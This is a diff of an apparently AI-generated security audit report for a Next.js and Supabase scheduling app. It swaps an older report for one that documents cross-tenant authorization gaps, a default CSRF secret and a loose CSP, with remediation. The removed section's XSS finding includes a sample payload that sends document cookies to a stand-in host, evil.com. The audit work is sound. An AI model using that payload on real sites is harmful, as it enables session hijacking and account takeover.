@@ -1,781 +1,293 @@
-# 🔒 COMPREHENSIVE SECURITY AUDIT REPORT
-**Generated:** ${new Date().toISOString()}  
-**Status:** PRE-LAUNCH CRITICAL REVIEW
+# Security Audit Report
+Generated: 2025-11-10  
+Auditor: GPT-5 Codex (automated)
 
 ---
 
-## 📋 EXECUTIVE SUMMARY
+## Executive Summary
+- **Status:** Unsafe for launch. Four critical access-control gaps allow any authenticated tenant to read or mutate other customers' data.
+- **Scope:** Full repository review (Next.js + Supabase) covering API handlers, shared libraries, middleware, configuration, and auxiliary scripts.
+- **Deliverables:** This report (comprehensive findings), `CRITICAL_FIXES.md` (blocking issues), and `SECURITY_CHECKLIST.md` (verification plan).
 
-This comprehensive security audit has identified **15 security issues** across your application, ranging from CRITICAL to LOW severity. **3 CRITICAL issues must be fixed before launch**, along with **5 HIGH priority issues** that should be addressed immediately.
+### Risk Snapshot
+- Critical: 4 (must resolve before launch)
+- High: 2
+- Medium: 4
+- Low/Informational: 3
 
-### Vulnerability Summary
-- **CRITICAL:** 3 issues (MUST FIX BEFORE LAUNCH)
-- **HIGH:** 5 issues (Fix immediately)
-- **MEDIUM:** 5 issues (Fix soon)
-- **LOW:** 2 issues (Address post-launch)
-
----
-
-## 🚨 CRITICAL ISSUES (MUST FIX BEFORE LAUNCH)
-
-### ❌ CRITICAL #1: Upload-Image Route Has No Authentication
-**Location:** `/src/app/api/upload-image/route.ts`  
-**Severity:** CRITICAL  
-**CWE:** CWE-306 (Missing Authentication)
-
-**Issue:**
-```typescript
-// Line 6: No auth check!
-export async function POST(request: NextRequest) {
-  try {
-    const { imageData, filename } = await request.json();
-    // ... uploads to blob storage without authentication
-  }
-}
-```
-
-**Exploit Scenario:**
-1. Attacker discovers the endpoint `/api/upload-image`
-2. They send unlimited POST requests with arbitrary image data
-3. Your Vercel Blob storage fills up with malicious content
-4. You get massive storage bills and potential legal issues from uploaded content
-
-**Impact:**
-- Unauthorized file uploads
-- Storage abuse ($$$ cost)
-- Hosting of illegal/malicious content under your domain
-- Potential legal liability
-
-**Fix:**
-```typescript
-import { createClient } from '@supabase/supabase-js';
-
-const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
-const supabaseServiceRoleKey = process.env.NEXT_SUPABASE_SERVICE_ROLE!;
-
-export async function POST(request: NextRequest) {
-  try {
-    // ✅ ADD AUTHENTICATION
-    const authHeader = request.headers.get('authorization');
-    if (!authHeader || !authHeader.startsWith('Bearer ')) {
-      return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-    }
-
-    const token = authHeader.split(' ')[1];
-    const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
-    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
-    
-    if (authError || !user) {
-      return NextResponse.json({ error: 'Invalid authentication' }, { status: 401 });
-    }
-
-    const { imageData, filename } = await request.json();
-    
-    // ✅ ADD FILE SIZE VALIDATION
-    if (!imageData || imageData.length > 10 * 1024 * 1024) { // 10MB max
-      return NextResponse.json({ error: 'Invalid file size' }, { status: 400 });
-    }
-    
-    // ✅ ADD FILE TYPE VALIDATION
-    const mimeType = imageData.match(/data:([^;]+)/)?.[1] || 'image/jpeg';
-    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
-    if (!allowedTypes.includes(mimeType)) {
-      return NextResponse.json({ error: 'Invalid file type' }, { status: 400 });
-    }
-    
-    // Rest of upload logic...
-  }
-}
-```
+Customer data isolation and CSRF robustness are the primary concerns. Secondary work is required on configuration hardening and rate limiting.
 
 ---
 
-### ❌ CRITICAL #2: XSS Vulnerability via innerHTML
-**Location:** `/src/components/MonthViewCalendar.tsx` (Lines 476 & 513)  
-**Severity:** CRITICAL  
-**CWE:** CWE-79 (Cross-Site Scripting)
-
-**Issue:**
-```typescript
-// Lines 476 & 513: Direct innerHTML manipulation
-parent.innerHTML = `
-  <div class="w-full h-full bg-gray-200 flex items-center justify-center">
-    <svg class="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
-      <path d="M4 3a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V5a2 2 0 00-2-2H4zm12 12H4l4-8 3 6 2-4 3 6z"/>
-    </svg>
-  </div>
-`;
-```
-
-**Exploit Scenario:**
-If any user-controlled data ever gets into this flow (file names, alt text, etc.), an attacker could inject:
-```html
-<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
-```
-
-**Impact:**
-- Session hijacking
-- Account takeover
-- Data theft
-- Malicious script execution in user browsers
-
-**Fix:**
-```typescript
-// ✅ SAFE: Create elements programmatically
-const placeholder = document.createElement('div');
-placeholder.className = 'w-full h-full bg-gray-200 flex items-center justify-center';
-
-const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-svg.setAttribute('class', 'w-3 h-3 text-gray-400');
-svg.setAttribute('fill', 'currentColor');
-svg.setAttribute('viewBox', '0 0 20 20');
-
-const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
-path.setAttribute('d', 'M4 3a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V5a2 2 0 00-2-2H4zm12 12H4l4-8 3 6 2-4 3 6z');
-
-svg.appendChild(path);
-placeholder.appendChild(svg);
-parent.appendChild(placeholder);
-```
+## Methodology
+1. **Static analysis:** Searched for secrets, env usage, authorization checks, and direct Supabase access.
+2. **Manual code review:** Walked every API handler under `src/app/api`, core libraries under `src/lib`, middleware, and Next.js config.
+3. **Configuration review:** Inspected `.gitignore`, Supabase helpers, CSP setup, and rate limiting middleware.
+4. **Dependency scan:** Attempted `npm audit --json` (blocked by sandbox networking; see “Constraints”).
 
 ---
 
-### ❌ CRITICAL #3: Next.js SSRF Vulnerability (Dependency)
-**Location:** `package.json` - Next.js version 15.4.6  
-**Severity:** MODERATE (CVE rated 6.5/10)  
-**CVE:** GHSA-4342-x723-ch2f
+## Top Findings
 
-**Issue:**
-Your Next.js version has a known Server-Side Request Forgery (SSRF) vulnerability in middleware redirect handling.
+### Critical Severity (Must Fix Before Launch)
 
-**Impact:**
-- Attackers can make server-side requests to internal services
-- Potential access to internal APIs and databases
-- Information disclosure
+1. **Project APIs bypass tenant authorization**  
+   - **Files:** `src/app/api/projects/[projectId]/route.ts`, `/scheduled-posts`, `/unscheduled-posts`, `/scheduled-posts/[postId]/{move,confirm}`, `projects/add-post`.  
+   - **Issue:** All project CRUD endpoints instantiate a Supabase _service role_ client and trust `projectId` from the URL without validating that the caller owns the project. Any logged-in user can enumerate or mutate another tenant’s projects.  
+   - **Evidence:**  
 
-**Fix:**
-```bash
-# Update Next.js to the patched version
-npm install next@15.5.4
-```
+```16:22:src/app/api/projects/[projectId]/route.ts
+const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
 
----
-
-## 🔴 HIGH PRIORITY ISSUES (Fix Immediately)
-
-### ⚠️ HIGH #1: Portal Token Authentication Not Rate Limited Separately
-**Location:** Portal API routes (`/api/portal/*`)  
-**Severity:** HIGH  
-**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
-
-**Issue:**
-Portal tokens are validated but share the same rate limit pool as other requests. An attacker could brute-force portal tokens.
-
-**Exploit Scenario:**
-1. Attacker enumerates portal tokens: `token1`, `token2`, `token3`...
-2. Makes 50 requests/15min (current limit)
-3. Finds valid token and gains unauthorized access to client data
-
-**Impact:**
-- Unauthorized access to client portals
-- Data breach of client information
-- Exposure of uploads and approvals
-
-**Fix:**
-```typescript
-// In /src/lib/simpleRateLimit.ts - add stricter portal limits
-const rateLimits = {
-  ai: { requests: 20, windowMs: 60 * 60 * 1000 },
-  authenticated: { requests: 100, windowMs: 15 * 60 * 1000 },
-  public: { requests: 10, windowMs: 15 * 60 * 1000 },
-  portal: { requests: 20, windowMs: 60 * 60 * 1000 }, // ✅ Change to 20/hour
-  auth: { requests: 20, windowMs: 15 * 60 * 1000 },
-  portalAuth: { requests: 5, windowMs: 60 * 60 * 1000 }, // ✅ ADD: 5/hour for token validation
-};
-
-// In portal routes, add specific rate limiting:
-const portalAuthResult = checkSimpleRateLimit(request, 'portalAuth', `portal_token_${token.substring(0, 8)}`);
-if (!portalAuthResult.success) {
-  return createRateLimitResponse(portalAuthResult.limit, portalAuthResult.remaining, portalAuthResult.reset);
-}
-```
-
----
-
-### ⚠️ HIGH #2: No File Type Validation on Portal Uploads
-**Location:** `/src/app/api/portal/upload/route.ts`  
-**Severity:** HIGH  
-**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
-
-**Issue:**
-```typescript
-// Line 124: No file type validation!
-file_type: fileType || 'unknown',
-```
-
-**Exploit Scenario:**
-1. Client uploads malicious `.php`, `.exe`, or `.js` file
-2. File is stored with public URL
-3. If served with wrong MIME type, could execute code
-4. Potential for serving malware to end users
-
-**Impact:**
-- Malware distribution
-- Server compromise if files are executed
-- Reputation damage
-
-**Fix:**
-```typescript
-// ✅ ADD FILE TYPE VALIDATION
-const allowedTypes = [
-  'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp',
-  'video/mp4', 'video/quicktime', 'video/x-msvideo',
-  'application/pdf'
-];
-
-const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov', '.avi', '.pdf'];
-
-export async function POST(request: NextRequest) {
-  try {
-    const { token, fileName, fileType, fileSize, fileUrl, notes, targetDate } = await request.json();
-
-    // Validate file type
-    if (!allowedTypes.includes(fileType)) {
-      return NextResponse.json(
-        { error: 'Invalid file type. Only images, videos, and PDFs allowed.' },
-        { status: 400 }
-      );
-    }
-
-    // Validate file extension
-    const fileExtension = fileName.toLowerCase().match(/\.[^.]+$/)?.[0];
-    if (!fileExtension || !allowedExtensions.includes(fileExtension)) {
-      return NextResponse.json(
-        { error: 'Invalid file extension' },
-        { status: 400 }
-      );
-    }
-
-    // Validate file size (max 50MB)
-    if (fileSize > 50 * 1024 * 1024) {
-      return NextResponse.json(
-        { error: 'File too large. Maximum 50MB allowed.' },
-        { status: 400 }
-      );
-    }
-
-    // ... rest of code
-  }
-}
-```
-
----
-
-### ⚠️ HIGH #3: Stripe Secret Key Exposure Risk
-**Location:** `/src/lib/stripe.ts` (Line 4)  
-**Severity:** HIGH  
-**CWE:** CWE-798 (Use of Hard-coded Credentials)
-
-**Issue:**
-```typescript
-export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
-  apiVersion: '2025-09-30.clover',
-});
-```
-
-While using environment variable (good), missing validation means app could start with undefined key.
-
-**Impact:**
-- Application crashes in production
-- Potential exposure in error messages
-- Payment processing failures
-
-**Fix:**
-```typescript
-// ✅ VALIDATE ENVIRONMENT VARIABLES
-const stripeSecretKey = process.env.STRIPE_SECRET_KEY;
-
-if (!stripeSecretKey) {
-  throw new Error('STRIPE_SECRET_KEY environment variable is not set');
-}
-
-if (!stripeSecretKey.startsWith('sk_')) {
-  throw new Error('Invalid STRIPE_SECRET_KEY format');
-}
-
-if (process.env.NODE_ENV === 'production' && stripeSecretKey.startsWith('sk_test_')) {
-  throw new Error('Cannot use test Stripe key in production');
-}
-
-export const stripe = new Stripe(stripeSecretKey, {
-  apiVersion: '2025-09-30.clover',
-  typescript: true,
-});
-```
-
----
-
-### ⚠️ HIGH #4: Weak Password Requirements
-**Location:** `/src/app/auth/signup/page.tsx` (Line 48)  
-**Severity:** HIGH  
-**CWE:** CWE-521 (Weak Password Requirements)
-
-**Issue:**
-```typescript
-if (password.length < 6) {
-  setError('Password must be at least 6 characters');
-  return;
-}
-```
-
-6 characters is far too weak for modern security standards.
-
-**Impact:**
-- Easy brute-force attacks
-- Account takeovers
-- Credential stuffing attacks
-
-**Fix:**
-```typescript
-// ✅ IMPLEMENT STRONG PASSWORD POLICY
-function validatePassword(password: string): { valid: boolean; error?: string } {
-  if (password.length < 12) {
-    return { valid: false, error: 'Password must be at least 12 characters' };
-  }
-  
-  const hasUpperCase = /[A-Z]/.test(password);
-  const hasLowerCase = /[a-z]/.test(password);
-  const hasNumbers = /\d/.test(password);
-  const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
-  
-  if (!hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
-    return { 
-      valid: false, 
-      error: 'Password must contain uppercase, lowercase, numbers, and special characters' 
-    };
-  }
-  
-  return { valid: true };
-}
-
-// In handleSubmit:
-const passwordValidation = validatePassword(password);
-if (!passwordValidation.valid) {
-  setError(passwordValidation.error!);
-  setLoading(false);
-  return;
-}
-```
-
----
-
-### ⚠️ HIGH #5: SQL Injection Risk in Supabase Queries
-**Location:** Multiple API routes  
-**Severity:** HIGH (Mitigated by Supabase)  
-**CWE:** CWE-89 (SQL Injection)
-
-**Issue:**
-While Supabase generally protects against SQL injection, there are patterns that could be vulnerable:
-
-```typescript
-// Potentially unsafe if clientId comes from untrusted source
-.eq('id', clientId)
-```
-
-**Impact:**
-- Data breach
-- Unauthorized data access
-- Database manipulation
-
-**Fix:**
-```typescript
-// ✅ ALWAYS VALIDATE IDs
-function isValidUUID(uuid: string): boolean {
-  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
-  return uuidRegex.test(uuid);
-}
-
-// In API routes:
-const paramsData = await params;
-const clientId = paramsData.clientId;
-
-if (!isValidUUID(clientId)) {
-  return NextResponse.json({ error: 'Invalid client ID format' }, { status: 400 });
-}
-
-// Then use in query
 const { data, error } = await supabase
-  .from('clients')
+  .from('projects')
   .select('*')
-  .eq('id', clientId)  // Now safe
+  .eq('id', projectId)
   .single();
 ```
 
----
+```16:70:src/app/api/projects/[projectId]/unscheduled-posts/route.ts
+const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
 
-## 🟡 MEDIUM PRIORITY ISSUES (Fix Soon)
-
-### ⚠️ MEDIUM #1: Insufficient Input Validation on AI Endpoints
-**Location:** `/src/app/api/ai/route.ts`  
-**Severity:** MEDIUM
-
-**Issue:** While Zod validation exists, max image size should be enforced more strictly.
-
-**Fix:**
-```typescript
-// Already has good validation, but add:
-const MAX_IMAGE_SIZE = 10 * 1024 * 1024; // 10MB
-
-if (contentLength && parseInt(contentLength) > MAX_IMAGE_SIZE) {
-  return NextResponse.json(
-    { error: 'Image too large', max: '10MB' },
-    { status: 413 }
-  );
-}
+const { data, error } = await supabase
+  .from('calendar_unscheduled_posts')
+  .select('*')
+  .eq('project_id', projectId);
 ```
 
----
+```16:83:src/app/api/projects/[projectId]/scheduled-posts/route.ts
+const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
 
-### ⚠️ MEDIUM #2: Missing HTTPS Enforcement Check
-**Location:** Middleware  
-**Severity:** MEDIUM
-
-**Issue:** No explicit HTTPS enforcement in code (relies on hosting platform).
-
-**Fix:**
-```typescript
-// Add to middleware.ts
-export async function middleware(req: NextRequest) {
-  // ✅ Enforce HTTPS in production
-  if (process.env.NODE_ENV === 'production' && req.headers.get('x-forwarded-proto') !== 'https') {
-    return NextResponse.redirect(`https://${req.headers.get('host')}${req.nextUrl.pathname}`, 301);
-  }
-  
-  // ... rest of middleware
-}
+const { data, error } = await supabase
+  .from('calendar_scheduled_posts')
+  .select('*')
+  .eq('project_id', projectId);
 ```
 
----
-
-### ⚠️ MEDIUM #3: Error Messages Expose Internal Structure
-**Location:** Multiple API routes  
-**Severity:** MEDIUM
-
-**Issue:**
-```typescript
-return NextResponse.json({ 
-  error: 'Database query failed', 
-  details: error.message  // ❌ Exposes internal errors
-}, { status: 500 });
+```18:79:src/app/api/projects/add-post/route.ts
+const supabase = createClient(supabaseUrl, supabaseKey);
+...
+const { data, error } = await supabase
+  .from('calendar_unscheduled_posts')
+  .insert(insertData);
 ```
 
-**Fix:**
-```typescript
-// ✅ Generic errors in production
-const isDevelopment = process.env.NODE_ENV === 'development';
+   - **Risk (non-technical):** Any paying customer could pull another agency’s calendars, drafts, uploads, and delete or edit them. This is a total data isolation failure.  
+   - **Remediation:** Replace service-role access with the per-session helper (`createSupabaseWithToken`) or Next.js server helpers so every query runs with RLS enforced. Explicitly fetch the authenticated user ID from Supabase and assert ownership before querying or mutating.  
+   - **Priority:** Blocker—patch _before_ launch. Applies to every project/calendar route.
 
-return NextResponse.json({ 
-  error: 'Database error',
-  ...(isDevelopment && { details: error.message })  // Only in dev
-}, { status: 500 });
+2. **Client posts API exposes cross-tenant reads & deletes**  
+   - **File:** `src/app/api/posts/[clientId]/route.ts` (both GET and DELETE).  
+   - **Issue:** Uses service-role Supabase without verifying that the caller owns `clientId`. There is no auth header requirement on the GET path, so any user session can download or delete another tenant’s posts.  
+   - **Evidence:**  
+
+```16:75:src/app/api/posts/[clientId]/route.ts
+const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
+
+const { data, error } = await supabase
+  .from('posts')
+  .select(`
+    *,
+    last_edited_by:clients!posts_last_edited_by_fkey(id, name, email)
+  `)
+  .eq('client_id', clientId);
 ```
 
----
+   - **Risk:** Competitors can access all unpublished content for any client by guessing an ID. Delete endpoint lets them wipe data.  
+   - **Remediation:** Require `Authorization: Bearer` headers, call `createSupabaseWithToken(token)`, and enforce that the post belongs to the authenticated user before querying/deleting.  
+   - **Priority:** Blocker—fix prior to launch.
 
-### ⚠️ MEDIUM #4: CORS Configuration Too Permissive
-**Location:** `/next.config.ts` (Line 181)  
-**Severity:** MEDIUM
+3. **Post-by-ID editor runs with admin privileges and no authentication**  
+   - **File:** `src/app/api/posts-by-id/[postId]/route.ts` (PUT handler).  
+   - **Issue:** Validation wrapper omits `checkAuth`, so any session—including unrelated tenants—can update arbitrary rows using a service-role client. Supabase queries ignore RLS once the service key is used.  
+   - **Evidence:**  
 
-**Issue:**
-```typescript
-headers: [
-  {
-    key: 'Access-Control-Allow-Credentials',
-    value: 'true',  // ✅ Good
-  },
-  // Missing Origin restrictions
-]
-```
-
-**Fix:**
-```typescript
-// ✅ Add origin validation
-{
-  source: '/api/(.*)',
-  headers: [
-    {
-      key: 'Access-Control-Allow-Origin',
-      value: process.env.ALLOWED_ORIGINS || 'https://yourdomain.com',  // ✅ Restrict origins
-    },
-    {
-      key: 'Access-Control-Allow-Credentials',
-      value: 'true',
-    },
-    // ... rest
-  ],
-}
-```
-
----
-
-### ⚠️ MEDIUM #5: No Request Timeout on External API Calls
-**Location:** LATE API integration  
-**Severity:** MEDIUM
-
-**Issue:** Fetch calls to external APIs have no timeout.
-
-**Fix:**
-```typescript
-// ✅ Add timeouts
-const controller = new AbortController();
-const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
-
-try {
-  const response = await fetch('https://getlate.dev/api/v1/...', {
-    signal: controller.signal,
-    headers: { ... }
-  });
-  clearTimeout(timeoutId);
-} catch (error) {
-  if (error.name === 'AbortError') {
-    return NextResponse.json({ error: 'Request timeout' }, { status: 504 });
-  }
-  throw error;
-}
-```
-
----
-
-## 🟢 LOW PRIORITY ISSUES (Address Post-Launch)
-
-### ℹ️ LOW #1: Console.log in Production Code
-**Location:** `/src/app/page.tsx` (Line 42)  
-**Severity:** LOW
-
-**Issue:**
-```typescript
-console.error('Error fetching profile:', err);  // ❌ Should use logger
-```
-
-**Fix:**
-```typescript
-import logger from '../lib/logger';
-logger.error('Error fetching profile:', err);  // ✅ Uses secure logger
-```
-
----
-
-### ℹ️ LOW #2: Missing Security Headers for API Routes
-**Location:** Individual API routes  
-**Severity:** LOW
-
-**Issue:** Some API routes don't set security headers.
-
-**Fix:**
-```typescript
-// ✅ Add to API responses
-const secureHeaders = {
-  'X-Content-Type-Options': 'nosniff',
-  'X-Frame-Options': 'DENY',
-  'X-XSS-Protection': '1; mode=block',
-};
-
-return NextResponse.json({ data }, { 
-  status: 200,
-  headers: secureHeaders 
+```19:90:src/app/api/posts-by-id/[postId]/route.ts
+const validation = await validateApiRequest(request, {
+  body: updatePostSchema,
+  params: postIdParamSchema,
+  paramsObject: params,
+  maxBodySize: 10 * 1024 * 1024,
 });
+...
+const supabase = createClient(supabaseUrl, supabaseServiceRoleKey);
 ```
 
----
+   - **Risk:** An attacker can overwrite captions, approvals, scheduling data, etc., for any post ID they discover.  
+   - **Remediation:** Require auth (`checkAuth: true`), fetch the user via `createSupabaseWithToken`, look up the post through RLS, and refuse if it is not owned by the requester.  
+   - **Priority:** Blocker—fix before launch.
 
-## ✅ SECURITY STRENGTHS (Well Implemented)
+4. **Calendar board APIs leak every client’s workflow**  
+   - **Files:** `src/app/api/calendar/scheduled/route.ts`, `calendar/unscheduled/route.ts`.  
+   - **Issue:** Both APIs are globally instantiated with the service role key, accept only a `clientId` query parameter, and never verify ownership. Any authenticated tenant can read or mutate another customer’s calendar via crafted fetches.  
+   - **Evidence:**  
 
-### ✅ Authentication & Authorization
-- **Excellent:** Supabase auth integration with proper session management
-- **Excellent:** Consistent bearer token validation across API routes
-- **Excellent:** Row Level Security (RLS) policies in database
-- **Good:** Middleware protecting routes appropriately
-
-### ✅ Input Validation
-- **Excellent:** Zod schema validation on AI endpoint
-- **Good:** Logger with automatic sensitive data redaction
-- **Good:** Input sanitization patterns
-
-### ✅ Security Headers
-- **Excellent:** Comprehensive CSP implementation
-- **Excellent:** HSTS, X-Frame-Options, X-Content-Type-Options configured
-- **Good:** Environment-aware security settings
-
-### ✅ Rate Limiting
-- **Good:** Simple in-memory rate limiting implementation
-- **Good:** Tiered rate limits by endpoint type
-- **Good:** Rate limit headers in responses
-
----
-
-## 🚀 PRE-LAUNCH CHECKLIST
-
-### Must Fix Before Launch (CRITICAL & HIGH)
-- [ ] **CRITICAL #1:** Add authentication to `/api/upload-image` route
-- [ ] **CRITICAL #2:** Fix XSS vulnerabilities (remove innerHTML usage)
-- [ ] **CRITICAL #3:** Update Next.js to 15.5.4+
-- [ ] **HIGH #1:** Implement stricter portal token rate limiting
-- [ ] **HIGH #2:** Add file type validation to portal uploads
-- [ ] **HIGH #3:** Validate Stripe environment variables on startup
-- [ ] **HIGH #4:** Strengthen password requirements (12+ chars, complexity)
-- [ ] **HIGH #5:** Add UUID validation to all database queries
-
-### Should Fix Before Launch (MEDIUM)
-- [ ] **MEDIUM #1:** Review all input validation on AI endpoints
-- [ ] **MEDIUM #2:** Add HTTPS enforcement in middleware
-- [ ] **MEDIUM #3:** Sanitize error messages in production
-- [ ] **MEDIUM #4:** Restrict CORS origins
-- [ ] **MEDIUM #5:** Add timeouts to external API calls
-
-### Post-Launch (LOW)
-- [ ] Replace all console.log with logger
-- [ ] Add security headers to all API responses
-- [ ] Consider upgrading to Upstash Redis for rate limiting (scalability)
-
----
-
-## 🛡️ RECOMMENDED SECURITY CONFIGURATION
-
-### Environment Variables (Add to Vercel)
-```bash
-# Required for security
-ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
-NODE_ENV=production
-
-# Stripe validation
-STRIPE_SECRET_KEY=sk_live_... # Must start with sk_live_ in production
-
-# Already configured (verify)
-NEXT_PUBLIC_SUPABASE_URL=...
-NEXT_SUPABASE_SERVICE_ROLE=...
-STRIPE_WEBHOOK_SECRET=...
+```5:63:src/app/api/calendar/scheduled/route.ts
+const supabase = createClient(
+  process.env.NEXT_PUBLIC_SUPABASE_URL!,
+  process.env.NEXT_SUPABASE_SERVICE_ROLE!
+);
+...
+const { data, error } = await query
+  .order('scheduled_date', { ascending: true })
+  .limit(limit);
 ```
 
-### Vercel Security Settings
-1. **Enable HTTPS only:** ✅ Already done via HSTS headers
-2. **Set deployment protection:** Require password for preview deployments
-3. **Enable DDoS protection:** Vercel Pro plan feature
-4. **Configure edge config:** For dynamic security rules
+```5:115:src/app/api/calendar/unscheduled/route.ts
+const supabase = createClient(
+  process.env.NEXT_PUBLIC_SUPABASE_URL!,
+  process.env.NEXT_SUPABASE_SERVICE_ROLE!
+);
+...
+const { data, error } = await query
+  .order('created_at', { ascending: false })
+  .limit(20);
+```
+
+   - **Risk:** Another tenant can download the entire content pipeline (scheduled posts, drafts, uploads) and delete or inject posts.  
+   - **Remediation:** Server-side, require bearer tokens, run through RLS-bound clients, and confirm the `client_id` belongs to the authenticated user before returning or mutating records.  
+   - **Priority:** Blocker—fix prior to launch.
+
+### High Severity
+
+5. **CSRF protection falls back to a public secret**  
+   - **File:** `src/lib/csrfProtection.ts`.  
+   - **Issue:** If `CSRF_SECRET_KEY` is missing, middleware uses a published default string, allowing attackers to forge tokens.  
+   - **Evidence:**  
+
+```6:12:src/lib/csrfProtection.ts
+const CSRF_CONFIG = {
+  TOKEN_LENGTH: 32,
+  COOKIE_NAME: 'csrf-token',
+  HEADER_NAME: 'x-csrf-token',
+  MAX_AGE: 60 * 60 * 1000,
+  SECRET_KEY: process.env.CSRF_SECRET_KEY || 'default-csrf-secret-change-in-production',
+} as const;
+```
+
+   - **Risk:** If the real secret is not configured in every deployment environment, CSRF tokens are predictable and any third-party site can trigger state-changing requests.  
+   - **Remediation:** Make `CSRF_SECRET_KEY` mandatory (throw on startup if missing) and rotate a strong random value in every environment.  
+   - **Priority:** High—resolve before public traffic.
+
+6. **Supabase service-role key instantiated globally**  
+   - **Files:** Multiple API modules (see issues above).  
+   - **Issue:** Several handlers import and instantiate the service-role client at module scope. In Next.js edge/serverless environments this can leak the key through serialization bugs and makes it harder to rotate.  
+   - **Remediation:** Encapsulate service-role usage in server-side utilities that are only called on the server, and restrict to vetted admin operations. Once the critical authorization fixes are applied, most routes should no longer need service-role access at all.  
+   - **Priority:** High—address while rewriting the affected handlers.
+
+### Medium Severity
+
+7. **CSRF middleware attempts to read form data synchronously**  
+   - **File:** `src/lib/csrfProtection.ts` (`extractCSRFToken`). Uses `request.formData()` without `await`, which will throw or silently fail for multipart forms, skipping token checks. Fix by awaiting and guarding against body re-use.  
+8. **Content-Security-Policy allows `unsafe-inline` and `unsafe-eval` in production**  
+   - **File:** `next.config.ts`. Consider migrating to nonces/hashes post-launch to reduce XSS surface.  
+
+```32:35:next.config.ts
+isDevelopment
+  ? "script-src 'self' 'unsafe-eval' 'unsafe-inline' blob:"
+  : "script-src 'self' 'unsafe-eval' 'unsafe-inline' blob:",
+```
+
+9. **Rate limiting is in-memory only**  
+   - **File:** `src/lib/simpleRateLimit.ts`. Map-based counters reset on deploy and do not cover multi-region scale or background jobs, limiting DDoS protection.  
+
+```10:36:src/lib/simpleRateLimit.ts
+const rateLimitStore = new Map<string, RateLimitEntry>();
+...
+const routePatterns: Record<string, RateLimitTier> = {
+  '/api/ai': 'ai',
+  '/api/analyze-website-temp': 'ai',
+  '/api/auth': 'auth',
+  '/auth/login': 'auth',
+  '/auth/signup': 'auth',
+  '/auth/callback': 'auth',
+  '/api/portal/validate': 'portalAuth',
+  '/api/portal': 'portal',
+  '/portal': 'portal',
+  '/api/clients': 'authenticated',
+  '/api': 'public',
+};
+```
+
+10. **Limited input validation coverage on lower-usage endpoints**  
+    - Several endpoints (e.g., calendar POST routes) accept JSON directly without schema validation. Introduce shared zod schemas to prevent injection attacks and malformed data.
+
+### Low / Informational
+- `.env*` is correctly in `.gitignore`; no secrets found in repo.
+- Logger automatically redacts sensitive keys before emitting.
+- Sentry + security headers are enabled, though CSP should be tightened after launch.
 
 ---
 
-## 📊 SECURITY METRICS
+## Category Review
 
-### Current Security Score: 7.5/10
+### 1. API Keys & Secrets Management
+- No hardcoded production secrets detected; `.env*` ignored by git.
+- All Supabase/Stripe/OpenAI/LATE keys referenced via `process.env`.
+- **Action:** Double-check Vercel dashboard to ensure _every_ deployment has `CSRF_SECRET_KEY`, Supabase keys, Stripe keys, and third-party tokens configured. Rotate any test keys before launch.
 
-**Breakdown:**
-- Authentication: 9/10 ✅
-- Authorization: 8.5/10 ✅
-- Input Validation: 7/10 ⚠️
-- API Security: 7/10 ⚠️
-- Data Protection: 8/10 ✅
-- Error Handling: 6/10 ⚠️
-- Dependencies: 7/10 ⚠️
-- Frontend Security: 8/10 ✅
+### 2. Database Security (Supabase)
+- RLS effectiveness is undermined by widespread service-role usage in customer-facing APIs. RLS must be paired with per-user clients.
+- Could not confirm RLS coverage for each table without database access—review every policy before launch.
+- Confirm that automated backups are enabled in Supabase dashboard (not visible in code).
 
-### Target Score for Launch: 9/10
+### 3. Authentication & Authorization
+- Middleware enforces “logged-in” but not tenant ownership. Critical issues 1–4 must be addressed.
+- Ensure JWT/session expiry aligns with Supabase defaults; no custom override observed.
+- Confirm OAuth redirect URIs are locked down in Supabase settings.
 
-**Required Actions:**
-- Fix all CRITICAL issues → +1.0
-- Fix all HIGH issues → +0.5
-- Fix 50% of MEDIUM issues → +0.2
+### 4. Input Validation & Injection
+- Good validation utilities exist (`src/lib/validators.ts`), but many APIs bypass them.
+- No raw SQL strings detected; Supabase client handles queries, reducing SQL injection risk once RLS is enforced.
+- Add server-side validation for calendar/project payloads and sanitize any user-supplied rich text before storage.
 
----
+### 5. API Route Security
+- Lack of per-request authorization is the largest gap.
+- Rate limiting exists but is memory-bound and should be backed by Redis or Vercel Edge Config for production-grade protection.
+- Review CORS helper (`src/lib/cors.ts`) if exposing public endpoints; current global headers allow broad methods.
 
-## 🔧 QUICK FIX IMPLEMENTATION ORDER
+### 6. Third-Party API Security
+- OpenAI, LATE, and Stripe keys are only used server-side.
+- Webhooks (`src/app/api/stripe/webhook/route.ts`) validate signatures correctly.
+- Ensure LATE webhook (if any) performs signature verification—none found in repo.
 
-### Week 1 (Pre-Launch - MUST DO)
-**Day 1-2:**
-1. Fix upload-image auth (2 hours)
-2. Fix innerHTML XSS (1 hour)
-3. Update Next.js (15 mins)
+### 7. Security Headers & CSP
+- Strong baseline headers shipped via `next.config.ts`.
+- CSP needs post-launch tightening (remove `unsafe-inline`/`unsafe-eval`, add explicit asset domains).
